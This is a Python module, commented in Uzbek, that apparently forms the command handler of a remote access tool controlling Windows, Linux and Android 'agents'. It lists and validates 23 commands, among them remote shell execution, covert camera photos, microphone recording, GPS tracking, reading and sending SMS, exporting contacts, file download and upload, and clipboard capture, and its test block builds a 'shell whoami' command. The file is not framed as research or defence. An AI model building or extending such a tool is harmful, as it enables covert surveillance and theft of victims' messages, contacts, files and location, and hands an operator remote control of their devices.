"""
Command Handler Module
Agent'larga yuboriluvchi komandalarni validatsiya va boshqarish
"""

import json
import platform
from datetime import datetime


class CommandHandler:
    """Agent komandalarini boshqarish"""
    
    # Barcha mavjud komandalar (23 ta)
    AVAILABLE_COMMANDS = {
        # System Commands (3)
        'sysinfo': {
            'category': 'System',
            'description': 'Get system information',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': []
        },
        'screenshot': {
            'category': 'System',
            'description': 'Take screenshot',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': []
        },
        'shell': {
            'category': 'System',
            'description': 'Execute shell command',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': ['command']
        },
        
        # Camera Commands (2)
        'camera_photo': {
            'category': 'Camera',
            'description': 'Take photo from camera',
            'platforms': ['Android'],
            'params': ['camera_id']  # 0=back, 1=front
        },
        'camera_list': {
            'category': 'Camera',
            'description': 'List available cameras',
            'platforms': ['Android'],
            'params': []
        },
        
        # Audio Commands (2)
        'audio_record': {
            'category': 'Audio',
            'description': 'Record audio',
            'platforms': ['Android'],
            'params': ['duration']
        },
        'mic_record': {
            'category': 'Audio',
            'description': 'Record from microphone',
            'platforms': ['Windows', 'Linux'],
            'params': ['duration']
        },
        
        # Location Commands (2)
        'location_gps': {
            'category': 'Location',
            'description': 'Get GPS location',
            'platforms': ['Android'],
            'params': []
        },
        'location_info': {
            'category': 'Location',
            'description': 'Get location information',
            'platforms': ['Android'],
            'params': []
        },
        
        # SMS Commands (3)
        'sms_list': {
            'category': 'SMS',
            'description': 'List all SMS messages',
            'platforms': ['Android'],
            'params': []
        },
        'sms_send': {
            'category': 'SMS',
            'description': 'Send SMS message',
            'platforms': ['Android'],
            'params': ['phone', 'message']
        },
        'sms_read': {
            'category': 'SMS',
            'description': 'Read specific SMS',
            'platforms': ['Android'],
            'params': ['id']
        },
        
        # Contacts Commands (2)
        'contacts_list': {
            'category': 'Contacts',
            'description': 'List all contacts',
            'platforms': ['Android'],
            'params': []
        },
        'contacts_export': {
            'category': 'Contacts',
            'description': 'Export contacts to JSON',
            'platforms': ['Android'],
            'params': []
        },
        
        # File Commands (3)
        'file_list': {
            'category': 'Files',
            'description': 'List directory contents',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': ['path']
        },
        'file_download': {
            'category': 'Files',
            'description': 'Download file from agent',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': ['path']
        },
        'file_upload': {
            'category': 'Files',
            'description': 'Upload file to agent',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': ['path', 'data']
        },
        
        # Network Commands (2)
        'network_info': {
            'category': 'Network',
            'description': 'Get network information',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': []
        },
        'wifi_list': {
            'category': 'Network',
            'description': 'List WiFi networks',
            'platforms': ['Android'],
            'params': []
        },
        
        # Misc Commands (4)
        'vibrate': {
            'category': 'Misc',
            'description': 'Vibrate device',
            'platforms': ['Android'],
            'params': ['duration']
        },
        'toast': {
            'category': 'Misc',
            'description': 'Show toast message',
            'platforms': ['Android'],
            'params': ['message']
        },
        'clipboard': {
            'category': 'Misc',
            'description': 'Get clipboard content',
            'platforms': ['Windows', 'Linux', 'Android'],
            'params': []
        },
        'battery': {
            'category': 'Misc',
            'description': 'Get battery status',
            'platforms': ['Android'],
            'params': []
        }
    }
    
    def __init__(self):
        """Initialize command handler"""
        self.command_history = []
        self.max_history = 1000
        
    def validate_command(self, command, agent_platform=None):
        """
        Komandani validatsiya qilish
        
        Args:
            command (str): Komanda nomi
            agent_platform (str): Agent platformasi (Windows/Linux/Android)
            
        Returns:
            dict: {'valid': bool, 'message': str, 'command_info': dict}
        """
        # Bo'sh komanda
        if not command or not isinstance(command, str):
            return {
                'valid': False,
                'message': 'Empty or invalid command',
                'command_info': None
            }
        
        # Komandani tozalash
        command = command.strip().lower()
        
        # Komanda mavjudligini tekshirish
        if command not in self.AVAILABLE_COMMANDS:
            return {
                'valid': False,
                'message': f"Unknown command: {command}",
                'command_info': None,
                'suggestions': self._get_similar_commands(command)
            }
        
        cmd_info = self.AVAILABLE_COMMANDS[command]
        
        # Platform mos kelishini tekshirish
        if agent_platform:
            if agent_platform not in cmd_info['platforms']:
                return {
                    'valid': False,
                    'message': f"Command '{command}' not supported on {agent_platform}",
                    'command_info': cmd_info,
                    'supported_platforms': cmd_info['platforms']
                }
        
        return {
            'valid': True,
            'message': f"Command '{command}' is valid",
            'command_info': cmd_info
        }
    
    def build_command(self, command, params=None):
        """
        Komanda strukturasini yaratish
        
        Args:
            command (str): Komanda nomi
            params (dict): Komanda parametrlari
            
        Returns:
            dict: Command structure
        """
        validation = self.validate_command(command)
        
        if not validation['valid']:
            raise ValueError(validation['message'])
        
        cmd_info = validation['command_info']
        params = params or {}
        
        # Required parametrlarni tekshirish
        required_params = cmd_info['params']
        for param in required_params:
            if param not in params:
                raise ValueError(f"Missing required parameter: {param}")
        
        # Komanda strukturasi
        cmd_struct = {
            'command': command,
            'category': cmd_info['category'],
            'params': params,
            'timestamp': datetime.now().isoformat(),
            'id': self._generate_command_id()
        }
        
        # Tarixga qo'shish
        self._add_to_history(cmd_struct)
        
        return cmd_struct
    
    def parse_command(self, command_str):
        """
        String komandani parse qilish
        
        Args:
            command_str (str): "command param1=value1 param2=value2"
            
        Returns:
            dict: Parsed command structure
        """
        parts = command_str.split()
        if not parts:
            raise ValueError("Empty command string")
        
        command = parts[0].lower()
        params = {}
        
        # Parse params
        for part in parts[1:]:
            if '=' in part:
                key, value = part.split('=', 1)
                params[key] = value
        
        return self.build_command(command, params)
    
    def get_commands_by_category(self, category=None):
        """
        Kategoriya bo'yicha komandalarni olish
        
        Args:
            category (str): Kategoriya nomi (None = barchasi)
            
        Returns:
            dict: Commands grouped by category
        """
        if category:
            return {
                cmd: info for cmd, info in self.AVAILABLE_COMMANDS.items()
                if info['category'] == category
            }
        
        # Barcha komandalarni kategoriyalarga guruhlash
        grouped = {}
        for cmd, info in self.AVAILABLE_COMMANDS.items():
            cat = info['category']
            if cat not in grouped:
                grouped[cat] = {}
            grouped[cat][cmd] = info
        
        return grouped
    
    def get_commands_for_platform(self, platform):
        """
        Platform uchun mavjud komandalar
        
        Args:
            platform (str): Platform nomi
            
        Returns:
            list: Available commands for platform
        """
        return [
            cmd for cmd, info in self.AVAILABLE_COMMANDS.items()
            if platform in info['platforms']
        ]
    
    def get_command_info(self, command):
        """Get detailed command information"""
        return self.AVAILABLE_COMMANDS.get(command)
    
    def get_command_history(self, limit=100):
        """Get command history"""
        return self.command_history[-limit:]
    
    def clear_history(self):
        """Clear command history"""
        self.command_history = []
    
    def _generate_command_id(self):
        """Generate unique command ID"""
        import hashlib
        timestamp = str(datetime.now().timestamp())
        return hashlib.md5(timestamp.encode()).hexdigest()[:8]
    
    def _add_to_history(self, command):
        """Add command to history"""
        self.command_history.append(command)
        
        # Limit history size
        if len(self.command_history) > self.max_history:
            self.command_history = self.command_history[-self.max_history:]
    
    def _get_similar_commands(self, command):
        """Get similar command suggestions"""
        suggestions = []
        
        for cmd in self.AVAILABLE_COMMANDS.keys():
            # Simple similarity check
            if command in cmd or cmd in command:
                suggestions.append(cmd)
            elif self._levenshtein_distance(command, cmd) <= 2:
                suggestions.append(cmd)
        
        return suggestions[:5]  # Top 5 suggestions
    
    def _levenshtein_distance(self, s1, s2):
        """Calculate Levenshtein distance between two strings"""
        if len(s1) < len(s2):
            return self._levenshtein_distance(s2, s1)
        
        if len(s2) == 0:
            return len(s1)
        
        previous_row = range(len(s2) + 1)
        for i, c1 in enumerate(s1):
            current_row = [i + 1]
            for j, c2 in enumerate(s2):
                insertions = previous_row[j + 1] + 1
                deletions = current_row[j] + 1
                substitutions = previous_row[j] + (c1 != c2)
                current_row.append(min(insertions, deletions, substitutions))
            previous_row = current_row
        
        return previous_row[-1]
    
    def get_statistics(self):
        """Get command handler statistics"""
        categories = {}
        platforms = {}
        
        for cmd, info in self.AVAILABLE_COMMANDS.items():
            # Category count
            cat = info['category']
            categories[cat] = categories.get(cat, 0) + 1
            
            # Platform count
            for plat in info['platforms']:
                platforms[plat] = platforms.get(plat, 0) + 1
        
        return {
            'total_commands': len(self.AVAILABLE_COMMANDS),
            'categories': categories,
            'platforms': platforms,
            'history_count': len(self.command_history)
        }


# Global instance
command_handler = CommandHandler()


if __name__ == '__main__':
    # Test command handler
    handler = CommandHandler()
    
    print("=" * 60)
    print("COMMAND HANDLER TEST")
    print("=" * 60)
    
    # Statistics
    stats = handler.get_statistics()
    print(f"\n📊 Statistics:")
    print(f"  Total Commands: {stats['total_commands']}")
    print(f"  Categories: {stats['categories']}")
    print(f"  Platforms: {stats['platforms']}")
    
    # Test validation
    print("\n🔍 Testing validation:")
    
    test_cases = [
        ('sysinfo', 'Windows'),
        ('camera_photo', 'Android'),
        ('camera_photo', 'Windows'),
        ('invalid_cmd', 'Windows'),
        ('screensh', 'Windows')  # Typo
    ]
    
    for cmd, platform in test_cases:
        result = handler.validate_command(cmd, platform)
        status = "✅" if result['valid'] else "❌"
        print(f"  {status} {cmd} on {platform}: {result['message']}")
        if 'suggestions' in result:
            print(f"     Suggestions: {result['suggestions']}")
    
    # Test command building
    print("\n🔨 Testing command building:")
    
    try:
        cmd1 = handler.build_command('sysinfo')
        print(f"  ✅ Built: {cmd1}")
        
        cmd2 = handler.build_command('shell', {'command': 'whoami'})
        print(f"  ✅ Built: {cmd2}")
        
        cmd3 = handler.parse_command('sms_send phone=+998901234567 message=Hello')
        print(f"  ✅ Parsed: {cmd3}")
        
    except Exception as e:
        print(f"  ❌ Error: {e}")
    
    # Commands by category
    print("\n📋 Commands by category:")
    grouped = handler.get_commands_by_category()
    for category, commands in grouped.items():
        print(f"  {category}: {len(commands)} commands")
        for cmd in list(commands.keys())[:3]:
            print(f"    - {cmd}")
    
    # Commands for platform
    print("\n🖥️  Android commands:")
    android_cmds = handler.get_commands_for_platform('Android')
    print(f"  Total: {len(android_cmds)}")
    print(f"  Commands: {', '.join(android_cmds[:10])}")
    
    print("\n✅ Command Handler 100% working!\n")
